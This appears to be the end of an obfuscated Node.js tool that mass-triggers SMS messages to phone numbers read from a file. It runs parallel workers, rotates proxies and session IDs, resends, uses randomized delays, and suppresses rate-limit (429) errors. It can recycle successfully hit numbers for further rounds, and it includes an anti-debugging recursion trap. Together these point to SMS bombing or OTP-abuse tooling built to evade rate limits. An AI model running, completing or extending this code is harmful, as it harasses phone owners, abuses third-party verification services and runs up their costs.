                  v851 = v796.splice(v850, 1)[0];
                return fn10(), Promise.resolve(v851);
              }
            };
          }
        })();
      let v809 = 0;
      const fn8 = () => {
          {
            if (v798.length === 0) return null;
            const v852 = v798[v809 % v798.length];
            return v809++, rotateSessionId(v852);
          }
        },
        v810 = new Set(),
        v811 = {};
      v811.flags = 'a';
      const v812 = fs.createWriteStream(v800, v811),
        v813 = {};
      v813.flags = 'a';
      const v814 = fs.createWriteStream(v801, v813),
        v815 = v807 ? Math.min(v760, v799.totalCount) : Math.min(v760, v796.length),
        v816 = [],
        v817 = setInterval(() => v802.render(), 500);
      async function fn9(v853) {
        while (true) {
          {
            const v854 = await v808();
            if (!v854) break;
            const v855 = fn8(),
              v856 = normalizePhoneNumber(v854).replace('+', ''),
              v857 = getCountryFromPhone(v856),
              v858 = v857.iso,
              v859 = v762 && v762 !== "random" ? v762 : v857.lang.split(',')[0];
            let v860 = v858;
            try {
              v860 = _displayNames.of(v858) || v858;
            } catch (v864) {}
            const v861 = v855 ? getProxyCountry(v855) : "Direct",
              v862 = '[' + v859 + "] Proxy: " + v861 + " | " + v860;
            try {
              {
                const v865 = await triggerSms(v854, {
                  'onStatus': v866 => v802.setStatus("Worker " + v853 + ':\x20' + v866),
                  'onLog': (v867, v868) => v802.addLog(v867, v868, v862),
                  'proxy': v855,
                  'workerId': v853,
                  'browserPref': v763,
                  'regionPref': v762,
                  'resends': v764,
                  'timeout': 0x9c40
                });
                if (v865.success) {
                  {
                    v802.successful++, v802.processed++, v810.add(v854.trim());
                    const v869 = v855 ? v855.host + ':' + v855.port : "direct",
                      v870 = new Date().toISOString().replace('T', '\x20').substring(0, 19);
                    v812.write('' + v865.phone + ("|lang:" + (v865.lang || v859)) + ("|proxy:" + v869) + ("|country:" + v860) + ("|ts:" + v870 + '\x0a')), v802.addLog("SMS Sent to " + v865.phone, "success", v862);
                  }
                } else {
                  v802.failed++, v802.processed++, v814.write((v865.phone || v854) + '|' + v865.message + '\x0a'), !v865.message.includes("429") && v802.addLog("Failed on " + (v865.phone || v854) + ':\x20' + v865.message, "error", v862);
                }
              }
            } catch (v871) {
              v802.failed++, v802.processed++, v814.write(v854 + '|' + v871.message + '\x0a');
              if (!v871.message.includes("429")) {
                v802.addLog("Fatal error on " + v854 + ':\x20' + v871.message, "error", v862);
              }
            }
            const v863 = Math.floor(Math.random() * 3000) + 1500;
            await delay(v863, v863 + 500);
          }
        }
      }
      for (let v872 = 0; v872 < v815; v872++) {
        v816.push(fn9(v872));
      }
      await Promise.all(v816), clearInterval(v817), await new Promise(v873 => v812.end(v873)), await new Promise(v874 => v814.end(v874)), v802.render(), v802.stop();
      const v818 = await selectOption("Processing Complete. What next?", [{
        'name': "Reuse successful numbers (" + v800 + ')',
        'value': "reuse"
      }, {
        'name': "Go Home (Restart)",
        'value': "home"
      }, {
        'name': "Exit",
        'value': "exit"
      }]);
      if (v818 === "reuse") {
        {
          if (fs.existsSync(v800)) {
            let v875 = fs.readFileSync(v800, "utf8").split('\x0a').map(v876 => v876.split('|')[0].trim()).filter(v877 => v877.length > 5);
            fs.writeFileSync(v759, v875.join('\x0a')), fs.writeFileSync(v800, ''), console.log("\n  [32m✓ Copied " + v875.length + " successful numbers to " + v759 + " and cleared " + v800 + ".[0m\n");
          } else console.log("\n  [31m✗ No successful numbers found.[0m\n"), v765 = false;
        }
      } else {
        if (v818 === "home") {
          {
            const v878 = await interactiveWizard();
            v754 = [v878.numbersFile, v878.threads, v878.proxiesFile, v878.region, v878.browser, "SKING-UI-HARDWARE-ID", v878.resends], v755 = v878.nexaConfig, v756 = v878.twoOoConfig || null, v757 = v878.smsBowerConfig || null, v758 = v878.zenexConfig || null, v759 = path.resolve(v754[0] || "numbers.txt"), v760 = parseInt(v754[1]) || 20, v761 = v754[2] !== undefined ? v754[2] : "proxies.txt";
            if (v761.toLowerCase() === "none" || v761 === "false") v761 = '';
          }
        } else v765 = false;
      }
    }
  }
  start()["catch"](v879 => {
    console.error(R("Fatal error: " + v879.message));
    process.exit(1);
  });
}
const v87 = {};
v87.triggerSms = triggerSms, module.exports = v87;
function fn2(v880) {
  function fn11(v881) {
    {
      fn11(++v881);
    }
  }
  try {
    {
      if (v880) {
        return fn11;
      } else fn11(0);
    }
  } catch (v882) {}
}